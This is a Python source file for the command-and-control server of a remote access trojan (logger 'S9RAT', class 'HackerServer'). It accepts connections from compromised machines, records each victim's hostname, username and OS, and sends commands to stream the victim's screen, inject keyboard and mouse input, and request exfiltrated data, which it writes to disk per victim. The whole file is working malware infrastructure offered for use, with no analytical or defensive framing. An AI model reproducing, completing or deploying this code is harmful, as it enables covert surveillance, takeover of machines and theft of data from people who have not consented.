
import socket
import threading
import time
import logging
import os
from .protocol import pack_message, recv_message, DEFAULT_PORT

logger = logging.getLogger("S9RAT")


class HackerServer:

    def __init__(self, port: int = DEFAULT_PORT, password: str = "",
                 output_dir: str = "rat_output"):
        self.port = port
        self.password = password
        self.output_dir = output_dir
        self._server_sock: socket.socket | None = None
        self._running = False
        self._clients: dict[str, dict] = {}
        self._lock = threading.Lock()
        self._on_client_connect = None
        self._on_client_disconnect = None
        self._on_screen_frame = None
        self._on_exfil_data = None
        os.makedirs(output_dir, exist_ok=True)

    def set_callbacks(self, on_connect=None, on_disconnect=None,
                      on_screen_frame=None, on_exfil_data=None):
        self._on_client_connect = on_connect
        self._on_client_disconnect = on_disconnect
        self._on_screen_frame = on_screen_frame
        self._on_exfil_data = on_exfil_data

    def start(self):
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.port))
        self._server_sock.listen(5)
        self._server_sock.settimeout(1.0)
        self._running = True
        logger.info(f"Server listening on port {self.port}")
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def stop(self):
        self._running = False
        with self._lock:
            for client_id, info in list(self._clients.items()):
                try:
                    info["sock"].close()
                except Exception:
                    pass
            self._clients.clear()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass

    def _accept_loop(self):
        while self._running:
            try:
                client_sock, addr = self._server_sock.accept()
                threading.Thread(
                    target=self._handle_client,
                    args=(client_sock, addr),
                    daemon=True,
                ).start()
            except socket.timeout:
                continue
            except Exception as e:
                if self._running:
                    logger.error(f"Accept error: {e}")

    def _handle_client(self, sock: socket.socket, addr: tuple):
        client_id = f"{addr[0]}:{addr[1]}"
        logger.info(f"New connection from {client_id}")

        try:
            sock.settimeout(30)
            msg_type, auth_data = recv_message(sock)
            if msg_type != "AUTH":
                sock.close()
                return

            if self.password and auth_data.get("password") != self.password:
                sock.sendall(pack_message("AUTH_FAIL", {}))
                sock.close()
                return

            sock.sendall(pack_message("AUTH_OK", {}))

            info = {
                "sock": sock,
                "addr": addr,
                "hostname": auth_data.get("hostname", "unknown"),
                "username": auth_data.get("username", "unknown"),
                "os": auth_data.get("os", "unknown"),
                "os_version": auth_data.get("os_version", ""),
                "arch": auth_data.get("arch", ""),
                "connected_at": time.time(),
                "screen_active": False,
                "control_enabled": False,
            }

            with self._lock:
                self._clients[client_id] = info

            if self._on_client_connect:
                self._on_client_connect(client_id, info)

            self._client_loop(sock, client_id, info)

        except Exception as e:
            logger.error(f"Client {client_id} error: {e}")
        finally:
            with self._lock:
                self._clients.pop(client_id, None)
            if self._on_client_disconnect:
                self._on_client_disconnect(client_id)
            try:
                sock.close()
            except Exception:
                pass
            logger.info(f"Client {client_id} disconnected")

    def _client_loop(self, sock: socket.socket, client_id: str, info: dict):
        while self._running and client_id in self._clients:
            try:
                sock.settimeout(1.0)
                msg_type, data = recv_message(sock)

                if msg_type == "SCREEN_FRAME":
                    frame_size = data.get("size", 0)
                    if frame_size > 0:
                        frame_data = b""
                        remaining = frame_size
                        while remaining > 0:
                            chunk = sock.recv(min(remaining, 65536))
                            if not chunk:
                                break
                            frame_data += chunk
                            remaining -= len(chunk)
                        if self._on_screen_frame:
                            self._on_screen_frame(client_id, frame_data)

                elif msg_type == "EXFIL_DATA":
                    exfil_type = data.get("type", "unknown")
                    exfil_data = data.get("data", {})
                    self._save_exfil(client_id, exfil_type, exfil_data)
                    if self._on_exfil_data:
                        self._on_exfil_data(client_id, exfil_type, exfil_data)

                elif msg_type == "HEARTBEAT_ACK":
                    pass

            except socket.timeout:
                continue
            except ConnectionError:
                break
            except Exception as e:
                logger.error(f"Client {client_id} loop error: {e}")
                break

    def send_command(self, client_id: str, msg_type: str, data: dict) -> bool:
        with self._lock:
            info = self._clients.get(client_id)
        if not info:
            return False
        try:
            info["sock"].sendall(pack_message(msg_type, data))
            return True
        except Exception as e:
            logger.error(f"Send error to {client_id}: {e}")
            return False

    def start_screen(self, client_id: str) -> bool:
        return self.send_command(client_id, "SCREEN_START", {})

    def stop_screen(self, client_id: str) -> bool:
        return self.send_command(client_id, "SCREEN_STOP", {})

    def enable_control(self, client_id: str) -> bool:
        return self.send_command(client_id, "CONTROL_ENABLE", {})

    def disable_control(self, client_id: str) -> bool:
        return self.send_command(client_id, "CONTROL_DISABLE", {})

    def send_input(self, client_id: str, input_type: str, **kwargs) -> bool:
        data = {"input_type": input_type, **kwargs}
        return self.send_command(client_id, "CONTROL_INPUT", data)

    def request_exfil(self, client_id: str, exfil_type: str) -> bool:
        return self.send_command(client_id, "EXFIL_REQUEST", {"type": exfil_type})

    def _save_exfil(self, client_id: str, exfil_type: str, data: dict):
        client_dir = os.path.join(self.output_dir, client_id.replace(":", "_"))
        os.makedirs(client_dir, exist_ok=True)
        filepath = os.path.join(client_dir, f"{exfil_type}.txt")
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"{key}: {value}\n")
                else:
                    f.write(str(data))
            logger.info(f"Exfil saved: {filepath}")
        except Exception as e:
            logger.error(f"Failed to save exfil: {e}")

    def get_clients(self) -> dict:
        with self._lock:
            return {k: {kk: vv for kk, vv in v.items() if kk != "sock"}
                    for k, v in self._clients.items()}
